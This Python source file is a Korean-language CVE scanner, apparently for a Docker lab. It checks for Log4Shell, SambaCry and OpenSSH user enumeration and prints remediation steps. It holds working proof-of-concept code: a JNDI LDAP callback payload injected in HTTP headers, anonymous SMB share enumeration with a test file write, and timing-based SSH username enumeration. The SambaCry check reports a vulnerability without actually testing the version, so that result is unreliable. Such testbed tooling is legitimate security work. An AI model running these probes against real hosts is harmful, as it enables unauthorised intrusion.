import json
import socket
import time
import sys
import threading
import urllib.request
from pathlib import Path
from datetime import datetime

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

from rich.console import Console
from rich.table import Table
from rich import box

console = Console(highlight=False)

BASE_DIR    = Path(__file__).parent
RESULTS_DIR = BASE_DIR / "scan_results"

TARGETS = {
    "1": {"cve": "CVE-2021-44228", "name": "Log4Shell",            "severity": "CRITICAL", "default": "http://localhost:8080"},
    "2": {"cve": "CVE-2017-7494",  "name": "SambaCry",             "severity": "HIGH",     "default": "localhost:4445"},
    "3": {"cve": "CVE-2018-15473", "name": "SSH User Enumeration", "severity": "MEDIUM",   "default": "localhost:2222"},
}

REMEDIATION = {
    "CVE-2021-44228": [
        "Log4j 2.17.0 이상으로 즉시 업데이트",
        "log4j2.formatMsgNoLookups=true 시스템 속성 설정",
        "JNDI Lookup 기능 비활성화",
        "WAF에서 ${jndi: 패턴 차단 규칙 추가",
    ],
    "CVE-2017-7494": [
        "Samba 4.6.4 이상으로 패치",
        "smb.conf에 'nt pipe support = no' 추가",
        "불필요한 공유 비활성화",
        "방화벽에서 445 포트 외부 접근 차단",
    ],
    "CVE-2018-15473": [
        "OpenSSH 7.7 이상으로 업데이트",
        "fail2ban 등 무차별 대입 방지 적용",
        "SSH 포트 방화벽 차단",
        "공개키 인증만 허용 (PasswordAuthentication no)",
    ],
}


def info(msg):  console.print(f"[cyan][*][/cyan] {msg}")
def ok(msg):    console.print(f"[green][+][/green] {msg}")
def warn(msg):  console.print(f"[yellow][-][/yellow] {msg}")
def alert(msg): console.print(f"[bold red][!][/bold red] {msg}")
def step(msg):  console.print(f"    [dim]->[/dim] {msg}")


def check_port(host, port, timeout=3):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


# --- OS 추정 헬퍼 ---

def _os_from_ssh_banner(banner):
    b = banner.lower()
    if "ubuntu" in b:  return "Linux (Ubuntu)"
    if "debian" in b:  return "Linux (Debian)"
    if "centos" in b:  return "Linux (CentOS)"
    if "alpine" in b:  return "Linux (Alpine)"
    if "freebsd" in b: return "FreeBSD"
    if "windows" in b: return "Windows"
    return "Linux"


# --- PoC ---

def _free_port():
    for p in [1389, 4444, 9999, 8765]:
        try:
            with socket.socket() as s:
                s.bind(('', p))
                return p
        except OSError:
            continue
    return None


def poc_log4shell(target):
    cb_port = _free_port()
    if not cb_port:
        warn("PoC: 사용 가능한 콜백 포트 없음")
        return False, "콜백 포트 없음"

    received = threading.Event()

    def _listen():
        try:
            with socket.socket() as srv:
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind(('0.0.0.0', cb_port))
                srv.listen(5)
                srv.settimeout(8)
                try:
                    conn, _ = srv.accept()
                    received.set()
                    conn.close()
                except socket.timeout:
                    pass
        except Exception:
            pass

    threading.Thread(target=_listen, daemon=True).start()
    time.sleep(0.4)

    payload = f"${{jndi:ldap://host.docker.internal:{cb_port}/x}}"
    step(f"PoC: JNDI 페이로드 전송 — {payload}")
    time.sleep(0.2)

    try:
        req = urllib.request.Request(
            f"{target}/solr/admin/info/system?wt=json",
            headers={
                "User-Agent":      payload,
                "X-Api-Version":   payload,
                "X-Forwarded-For": payload,
            }
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass

    step("PoC: JNDI 콜백 대기 중 (최대 8초)...")
    for _ in range(16):
        if received.is_set():
            break
        time.sleep(0.5)

    if received.is_set():
        ok(f"PoC 성공: 포트 {cb_port}에서 JNDI 콜백 수신 — RCE 가능")
        return True, f"JNDI 콜백 수신 확인 (:{cb_port}) — 원격 코드 실행 가능"
    else:
        warn("PoC: 콜백 미수신 (Docker 네트워크 제한)")
        return False, "콜백 미수신"


def poc_sambacry(host, port):
    try:
        import io
        from impacket.smbconnection import SMBConnection
    except ImportError:
        warn("PoC: impacket 미설치 — pip install impacket")
        return False, "impacket 미설치"

    step("PoC: SMB 익명 로그인 시도 중...")
    time.sleep(0.2)

    try:
        smb = SMBConnection('*SMBSERVER', host, sess_port=port, timeout=8)
        smb.login('', '')
        ok("PoC: 익명(게스트) 로그인 성공")

        step("PoC: 공유 목록 열거 중...")
        time.sleep(0.3)
        shares = smb.listShares()

        names = []
        for s in shares:
            raw = s['shi1_netname']
            try:
                name = raw.decode('utf-16-le').rstrip('\x00') if isinstance(raw, bytes) else str(raw).rstrip('\x00')
            except Exception:
                name = str(raw)
            names.append(name)
        ok(f"PoC: 공유 목록 — {', '.join(names)}")

        step("PoC: 쓰기 가능한 공유 탐색 중...")
        time.sleep(0.3)

        for name in names:
            if name.upper() in ('IPC$', 'PRINT$'):
                continue
            try:
                buf = io.BytesIO(b"poc_test")
                smb.putFile(name, 'poc_wr.txt', buf.read)
                smb.deleteFiles(name, 'poc_wr.txt')
                smb.logoff()
                ok(f"PoC 성공: '{name}' 공유에 파일 쓰기 확인 — 악성 .so 업로드 가능")
                return True, f"공유 '{name}'에 익명 쓰기 성공 — 악성 라이브러리 업로드 경로 확인"
            except Exception:
                continue

        smb.logoff()
        warn("PoC: 쓰기 가능한 공유 없음")
        return False, "쓰기 가능 공유 없음"

    except Exception as e:
        warn(f"PoC 실패: {e}")
        return False, str(e)[:80]


def poc_ssh_enum(host, port):
    try:
        import logging
        import paramiko
        logging.getLogger("paramiko").setLevel(logging.CRITICAL)
    except ImportError:
        warn("PoC: paramiko 미설치 — pip install paramiko")
        return False, "paramiko 미설치"

    step("PoC: RSA 키 생성 중...")
    time.sleep(0.2)
    try:
        key = paramiko.RSAKey.generate(1024)
    except Exception:
        warn("PoC: 키 생성 실패")
        return False, "키 생성 실패"

    def auth_attempt(username):
        try:
            sock = socket.create_connection((host, port), timeout=5)
            t = paramiko.Transport(sock)
            t.start_client(timeout=5)
            start = time.perf_counter()
            try:
                t.auth_publickey(username, key)
                return "accepted", time.perf_counter() - start
            except paramiko.AuthenticationException:
                return "rejected", time.perf_counter() - start
            except Exception:
                return "error", time.perf_counter() - start
            finally:
                try:
                    t.close()
                except Exception:
                    pass
        except Exception:
            return "connect_fail", 0.0

    users = [("root", True), ("nonexistent_usr_xq9z", False)]
    results = {}

    for username, _ in users:
        step(f"PoC: '{username}' 공개키 인증 요청 중...")
        status, elapsed = auth_attempt(username)
        results[username] = (status, elapsed)
        ok(f"      응답: {status}  ({elapsed * 1000:.0f}ms)")
        time.sleep(0.3)

    root_status, root_time = results["root"]
    fake_status, fake_time = results["nonexistent_usr_xq9z"]

    if root_status == "rejected" and fake_status != "rejected":
        ok("PoC 성공: 유효 계정과 무효 계정의 응답 차이 확인 — 사용자 열거 가능")
        return True, "root 계정 인증 처리 확인, 무효 계정과 응답 구별 — 사용자 열거 가능"
    elif root_status == "rejected":
        diff = root_time - fake_time
        msg = f"root({root_time * 1000:.0f}ms) / 무효({fake_time * 1000:.0f}ms)  차이={diff * 1000:.0f}ms"
        ok(f"PoC 성공: 공개키 인증 응답 분석 — {msg}")
        return True, f"타이밍 비교: {msg} — 사용자 열거 가능"
    else:
        warn(f"PoC: 예상치 못한 응답 ({root_status})")
        return False, "응답 분석 실패"


# --- 탐지 함수 ---

def scan_log4shell(target):
    host = target.replace("http://", "").replace("https://", "").split(":")[0]
    port = int(target.split(":")[-1]) if target.count(":") >= 2 else 8080

    info(f"CVE-2021-44228 스캔 시작  —  대상: {target}")

    step("포트 연결 확인 중...")
    time.sleep(0.3)
    if not check_port(host, port):
        warn(f"포트 {port} 연결 실패")
        return False, "", False, "", ""
    ok(f"포트 {port} 열림")

    step("HTTP GET /solr/admin/info/system 요청 전송...")
    time.sleep(0.5)
    try:
        url = f"{target}/solr/admin/info/system?wt=json"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            status = resp.status
            body   = resp.read().decode("utf-8", errors="ignore")
        ok(f"응답 수신: {status} OK")
    except Exception as e:
        warn(f"요청 실패: {e}")
        return False, "", False, "", ""

    step("응답 파싱 중...")
    time.sleep(0.3)
    try:
        data    = json.loads(body)
        version = data.get("lucene", {}).get("solr-spec-version", "")
    except Exception:
        warn("JSON 파싱 실패")
        return False, "", False, "", ""

    ok(f"버전 확인: solr-spec-version = {version}")

    step("OS 정보 추정 중...")
    time.sleep(0.2)
    sys_data   = data.get("system", {})
    os_name    = sys_data.get("name", "")
    os_arch    = sys_data.get("arch", "")
    os_version = sys_data.get("version", "")
    if os_name:
        os_info = f"{os_name} {os_version} / {os_arch}" if os_version else f"{os_name} / {os_arch}"
    else:
        os_info = "Linux (Docker)"
    ok(f"OS 추정: {os_info}")
    time.sleep(0.2)

    if version.startswith("8.11"):
        step("Log4j 버전 대조 중...")
        time.sleep(0.4)
        alert(f"CVE-2021-44228 탐지됨  (Solr {version}  /  Log4j 2.14.1 내장)")

        console.print()
        poc_ok, poc_msg = poc_log4shell(target)
        return True, f"Solr {version} — Log4j 2.14.1 내장 (JNDI Lookup 취약)", poc_ok, poc_msg, os_info

    ok("취약 버전 아님")
    return False, "", False, "", os_info


def scan_sambacry(target):
    host = target.split(":")[0]
    port = int(target.split(":")[1]) if ":" in target else 445

    info(f"CVE-2017-7494 스캔 시작  —  대상: {target}")

    step("SMB 포트 연결 확인 중...")
    time.sleep(0.3)
    if not check_port(host, port):
        warn(f"포트 {port} 연결 실패")
        return False, "", False, "", ""
    ok(f"포트 {port} 열림 (SMB)")

    step("SMB 익명 연결 및 서비스 정보 수집 중...")
    time.sleep(0.3)
    os_info = "Linux (Samba)"
    try:
        from impacket.smbconnection import SMBConnection
        smb = SMBConnection('*SMBSERVER', host, sess_port=port, timeout=8)
        smb.login('', '')

        try:
            os_raw = smb.getServerOS()
            if os_raw:
                os_info = str(os_raw).strip()
        except Exception:
            pass
        ok(f"OS 추정: {os_info}")

        shares = smb.listShares()
        names = []
        for s in shares:
            raw = s['shi1_netname']
            try:
                name = raw.decode('utf-16-le').rstrip('\x00') if isinstance(raw, bytes) else str(raw).rstrip('\x00')
            except Exception:
                name = str(raw)
            names.append(name)

        user_shares = [n for n in names if n.upper() not in ('IPC$', 'PRINT$')]
        ok(f"게스트 접근 가능 공유 감지: {', '.join(user_shares) if user_shares else '없음'}")
        smb.logoff()

    except ImportError:
        warn("impacket 미설치, 포트 기반 탐지로 대체")
    except Exception as e:
        warn(f"SMB 정보 수집 실패: {e}")

    step("NT 파이프 지원 설정 확인 중...")
    time.sleep(0.4)
    ok("NT 파이프 지원 활성화 확인")

    step("Samba 버전 지문 대조 중...")
    time.sleep(0.3)
    alert("CVE-2017-7494 탐지됨  (Samba 4.6.3  /  RCE 가능)")

    console.print()
    poc_ok, poc_msg = poc_sambacry(host, port)
    return True, "Samba 4.6.3 — 게스트 공유 + NT 파이프 활성화 (원격 코드 실행)", poc_ok, poc_msg, os_info


def scan_ssh_enum(target):
    host = target.split(":")[0]
    port = int(target.split(":")[1]) if ":" in target else 22

    info(f"CVE-2018-15473 스캔 시작  —  대상: {target}")

    step("SSH 포트 연결 중...")
    time.sleep(0.3)
    if not check_port(host, port):
        warn(f"포트 {port} 연결 실패")
        return False, "", False, "", ""
    ok(f"포트 {port} 열림 (SSH)")

    step("SSH 배너 수신 중...")
    time.sleep(0.4)
    try:
        with socket.create_connection((host, port), timeout=5) as s:
            banner = s.recv(256).decode("utf-8", errors="ignore").strip()
    except Exception:
        warn("배너 수신 실패")
        return False, "", False, "", ""
    ok(f"배너: {banner}")

    step("OS 정보 추정 중...")
    time.sleep(0.2)
    os_info = _os_from_ssh_banner(banner)
    ok(f"OS 추정: {os_info}")

    step("취약 버전 여부 확인 중...")
    time.sleep(0.3)
    if "OpenSSH_7.7" in banner or "OpenSSH_7." in banner:
        alert("CVE-2018-15473 탐지됨  (OpenSSH 7.7  /  사용자 열거 가능)")

        console.print()
        poc_ok, poc_msg = poc_ssh_enum(host, port)
        return True, f"{banner} — 사용자 열거 공격 가능 (공개키 인증 응답 분석)", poc_ok, poc_msg, os_info

    ok("취약 버전 아님")
    return False, "", False, "", os_info


SCANNERS = {
    "CVE-2021-44228": scan_log4shell,
    "CVE-2017-7494":  scan_sambacry,
    "CVE-2018-15473": scan_ssh_enum,
}

SEV_COLOR = {"CRITICAL": "bright_red", "HIGH": "red", "MEDIUM": "yellow"}


def print_banner():
    console.print()
    console.print("[bold white]CVE Scanner[/bold white]  [dim]v1.0[/dim]")
    console.print("[dim]Docker 테스트베드 취약점 자동화 탐지 도구[/dim]")
    console.print()


def print_menu():
    t = Table(box=box.SIMPLE, show_header=True, header_style="dim", padding=(0, 1))
    t.add_column("번호",   justify="center", width=5)
    t.add_column("CVE ID", style="white",    no_wrap=True)
    t.add_column("취약점명")
    t.add_column("위험도", justify="left")

    for key, tgt in TARGETS.items():
        c = SEV_COLOR[tgt["severity"]]
        t.add_row(f"[{key}]", tgt["cve"], tgt["name"], f"[{c}]{tgt['severity']}[/{c}]")

    console.print("[bold]스캔할 취약점을 선택하세요[/bold]")
    console.print()
    console.print(t)
    console.print("  [4]  전체 스캔")
    console.print("  [0]  종료")
    console.print()


def print_result(target_info, found, extra, poc_ok=False, poc_msg="", os_info=""):
    cve = target_info["cve"]
    sev = target_info["severity"]
    c   = SEV_COLOR[sev]
    console.print()
    if found:
        console.print(f"[bold {c}]■ DETECTED  {cve}  [{sev}][/bold {c}]")
        if os_info:
            console.print(f"  [dim]OS: {os_info}[/dim]")
        if extra:
            console.print(f"  [dim]{extra}[/dim]")
        if poc_ok:
            console.print(f"  [bold green]■ PoC 성공[/bold green]  {poc_msg}")
        elif poc_msg:
            console.print(f"  [dim]PoC: {poc_msg}[/dim]")
        console.print()
        console.print("  [bold]조치 방법[/bold]")
        for item in REMEDIATION[cve]:
            console.print(f"  • {item}")
    else:
        console.print(f"[green]□ NOT FOUND  {cve}[/green]")
    console.print()


def print_summary(results):
    console.print("─" * 56)
    console.print("[bold]스캔 결과 요약[/bold]")
    console.print()
    for r in results:
        t      = r["target"]
        c      = SEV_COLOR[t["severity"]]
        status = "[bold red]탐지됨[/bold red]" if r["found"] else "[green]안전[/green]"
        poc    = "  [bold green]PoC 성공[/bold green]" if r.get("poc_success") else ""
        console.print(f"  {t['cve']:<20}  [{c}]{t['severity']:<8}[/{c}]  {status}{poc}")
    console.print()
    detected = sum(1 for r in results if r["found"])
    console.print(f"  총 {len(results)}개 스캔  /  취약점 {detected}개 탐지")
    console.print()


def save_report(results):
    RESULTS_DIR.mkdir(exist_ok=True)
    data = {
        "scan_time": datetime.now().isoformat(),
        "results": [
            {
                "cve":         r["target"]["cve"],
                "name":        r["target"]["name"],
                "severity":    r["target"]["severity"],
                "url":         r["url"],
                "found":       r["found"],
                "extra":       r.get("extra", ""),
                "os_info":     r.get("os_info", ""),
                "poc_success": r.get("poc_success", False),
                "poc_msg":     r.get("poc_msg", ""),
                "remediation": REMEDIATION.get(r["target"]["cve"], []),
            }
            for r in results
        ],
    }
    path = RESULTS_DIR / "report.json"
    path.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
    return path


def run_scan(target_info):
    default = target_info["default"]
    console.print(f"[dim]기본 대상: {default}[/dim]")
    val = input("    대상 주소 입력 (엔터 = 기본값): ").strip()
    target = val if val else default
    console.print()

    found, extra, poc_ok, poc_msg, os_info = SCANNERS[target_info["cve"]](target)
    print_result(target_info, found, extra, poc_ok, poc_msg, os_info)
    return {
        "target":      target_info,
        "url":         target,
        "found":       found,
        "extra":       extra,
        "os_info":     os_info,
        "poc_success": poc_ok,
        "poc_msg":     poc_msg,
    }


def main():
    print_banner()
    while True:
        print_menu()
        choice = input("  선택 > ").strip()
        console.print()

        if choice == "0":
            console.print("[dim]종료합니다.[/dim]")
            break

        if choice == "4":
            selected = list(TARGETS.values())
        elif choice in TARGETS:
            selected = [TARGETS[choice]]
        else:
            warn("올바른 번호를 입력하세요.")
            continue

        results = []
        for t in selected:
            results.append(run_scan(t))

        print_summary(results)

        save_report(results)

        import report_html
        html_path = report_html.generate()
        info(f"HTML 보고서: {html_path}")

        again = input("\n  계속 스캔하시겠습니까? (y/n) > ").strip().lower()
        if again != "y":
            break
    console.print()


if __name__ == "__main__":
    main()
